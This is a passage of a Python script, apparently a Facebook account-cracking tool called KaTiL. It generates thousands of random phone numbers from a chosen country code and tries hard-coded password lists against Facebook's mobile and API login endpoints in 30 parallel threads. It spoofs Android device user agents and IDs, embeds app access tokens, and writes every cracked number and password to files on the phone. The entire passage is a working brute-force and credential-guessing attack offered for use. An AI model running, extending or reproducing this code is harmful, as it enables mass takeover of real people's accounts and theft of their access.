                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')

def afg2():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghanistan','jan jan','afghan123','khan12345','khankhan','khan786']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')


def afg3():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghanistan','afghan1122','khan12345','pubg12345','afghan112']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')




def rdx2():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(api,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')


def cid2():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(api,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')

def rdx3():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(api1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')


def cid3():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(api1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')

def rdx4():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')


def cid4():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')



def m2():
	clear()
	print(logo)
	print('[1] Auto Pass Random Cloning')
	print('[2] Auto Pass Random Cloning')
	print('[3] Auto Pass Random Cloning')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		m_m2()
	if riaz =='2':
		rdx2()
	if riaz =='3':
		cid2()
	else:
		print('[•] Select Ryt Option')
		
def m_m2():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(api,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')
		
#
def m3():
	clear()
	print(logo)
	print('[1] Auto Pass Random Cloning')
	print('[2] Auto Pass Random Cloning')
	print('[3] Auto Pass Random Cloning')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		m_m3()
	if riaz =='2':
		rdx3()
	if riaz =='3':
		cid3()
	else:
		print('[•] Select Ryt Option')
		
#
def m_m3():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(api1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')
		
#
def m4():
	clear()
	print(logo)
	print('[1] Auto Pass Random Cloning')
	print('[2] Auto Pass Random Cloning')
	print('[3] Auto Pass Random Cloning')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		m_m4()
	if riaz =='2':
		rdx4()
	if riaz =='3':
		cid4()
	else:
		print('[•] Select Ryt Option')
	
def m_m4():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')
	
#





def choice(uid,pwx,tl):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[KaTiL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '59e122650d1590d4ecdd7c00ccc6bd44'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3040};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '59e122650d1590d4ecdd7c00ccc6bd44'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": ids,
        "password": f"#PWD_FB4A:0:{time.time()}:{pas}",
        "generate_analytics_claim": "1",
        "community_id": "",
        "linked_guest_account_userid": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": device_id,
        "secure_family_device_id":secure_family_device_id ,
        "sim_serials": '["00920062214578163178"]',
        "credentials_type": "password",
        "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
        "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
        "enroll_misauth": "false",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "jazoest": str(random.randint(22300,22999)),
        "meta_inf_fbmeta": "V2_UNTAGGED",
        "advertiser_id": adid,
        "encrypted_msisdn": "¤tly_logged_in_userid=0",
        "locale": "en_US",
        "client_country_code": "PK",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "sig": sig,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
        }
   
                        head={
        "Host": "b-graph.facebook.com",
        "X-Fb-Request-Analytics-Tags": '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Fb-Connection-Type": "WIFI",
        #"Content-Encoding": "gzip",
        "X-Fb-Net-Hni": "41003",
        "X-Fb-Sim-Hni": "41003",
        "Zero-Rated": "0",
        "X-Fb-Friendly-Name": "authenticate",
        "X-Fb-Connection-Quality": "GOOD",
        "Authorization": "OAuth null",
        "User-Agent": ua,
        "X-Fb-Device-Group": "5722",
        "X-Tigon-Is-Retry": "False",
        "Priority": "u=3,i",
        "Accept-Encoding": "gzip,deflate",
        "X-Fb-Http-Engine": "Liger",
        "X-Fb-Client-Ip": "True",
        "X-Fb-Server-Cluster": "True",
        "Content-Length": str(clen),
      }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m[Kashif-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KaTiL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                       # print('\r\r\x1b[1;96m[Kashif-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Kashif-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

#
		
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[Kashif-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        header_freefb = {'authority': 'p.facebook.com',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="115", "Google Chrome";v="115"',
                        'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="115.0.5833.223", "Google Chrome";v="115.0.5833.223"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-ch-ua-platform-version': '""',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5833.223 Safari/537.36',
                        'viewport-width': '980',}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KaTiL=session.cookies.get_dict().keys()
                        if "c_user" in KaTiL:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[Kashif-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KaTiL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Kashif:
                                if 'y' in pcp:
                                      #  print('\r\r\x1b[1;91m[KaTiL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Kashif-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[Kashif-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[Kashif-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KaTiL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                              #  print('\r\x1b[1;96m[KaTiL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Kashif-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
 #rndm method new
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[Kashif-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
